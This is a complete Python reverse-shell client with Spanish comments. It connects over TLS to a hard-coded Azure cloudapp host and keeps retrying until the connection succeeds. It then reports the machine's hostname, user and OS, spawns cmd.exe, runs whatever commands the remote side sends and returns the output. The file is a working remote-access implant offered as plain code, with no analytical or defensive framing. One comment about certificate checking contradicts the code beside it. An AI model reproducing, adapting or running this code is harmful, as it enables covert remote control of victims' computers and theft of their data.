import socket
import time
import subprocess
import platform
import getpass
import ssl
import certifi

LHOST = "winserver.eastus.cloudapp.azure.com"
LPORT = 443
BUFFER_SIZE = 4096
RETRY_DELAY = 5

def connect():
    while True:
        try:
            print(f"[~] Intentando conectar a {LHOST}:{LPORT} (TLS)...")

            context = ssl.create_default_context(cafile=certifi.where())
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED  # No verifica el certificado (puedes ajustar esto)

            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            tls_socket = context.wrap_socket(raw_socket, server_hostname=LHOST)

            tls_socket.connect((LHOST, LPORT))
            print(f"[+] Conexión TLS establecida con {LHOST}:{LPORT}")

            username = getpass.getuser()
            hostname = socket.gethostname()
            os_info = f"{platform.system()} {platform.release()}"

            info = f"Equipo: {hostname} | Usuario: {username} | Sistema: {os_info}"
            tls_socket.send(info.encode("utf-8"))

            return tls_socket

        except Exception as e:
            print(f"[!] Error de conexión TLS: {e}")
            print(f"[~] Reintentando en {RETRY_DELAY} segundos...\n")
            time.sleep(RETRY_DELAY)

def shell(client):
    print("[*] Iniciando shell remota (cmd.exe)...")
    proc = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,  # Redirige stderr a stdout
        shell=True
    )
    empty_count = 0
    while True:
        try:
            cmd = client.recv(BUFFER_SIZE).decode("utf-8").strip()
            if not cmd:
                client.send(">".encode("utf-8"))
                empty_count += 1
                print(f"[~] Comando vacío #{empty_count}")
                if empty_count >= 5:
                    print("[x] Demasiados comandos vacíos. Cerrando conexión.")
                    break
                continue
            else:
                empty_count = 0  # Reset si el comando es válido
                print(f"[>] Comando recibido: {cmd}")

            

            if cmd.lower() == "exit":
                print("[*] Comando 'exit' recibido. Cerrando sesión.")
                client.send("[+] Cerrando sesión.\n".encode("utf-8"))
                break

            proc.stdin.write((cmd + "\n").encode("CP850"))
            proc.stdin.flush()
            time.sleep(0.3)

            output = b""
            while True:
                try:
                    data = proc.stdout.read1(BUFFER_SIZE).decode('CP850', errors='replace').encode('utf-8')
                    if not data:
                        break
                    output += data
                    if len(data) < BUFFER_SIZE:
                        break
                except:
                    break

            if not output:
                output = proc.stderr.read1(BUFFER_SIZE).decode('CP850', errors='replace').encode('utf-8')

            client.send(output if output else b"[sin salida]\n")
            print("[✓] Resultado enviado al cliente.\n")

        except Exception as e:
            print(f"[!] Error en la shell: {e}")
            try:
                client.send(f"[!] Error: {e}\n".encode("utf-8"))
            except:
                print("[!] No se pudo enviar el mensaje de error.")
            break

    proc.kill()
    client.close()
    print("[x] Conexión cerrada.\n")

def main():
    while True:
        client = connect()
        try:
            shell(client)
        except Exception as e:
            print(f"[!] Error inesperado: {e}")
            client.close()
            print("[~] Intentando reconectar...\n")

if __name__ == "__main__":
    main()
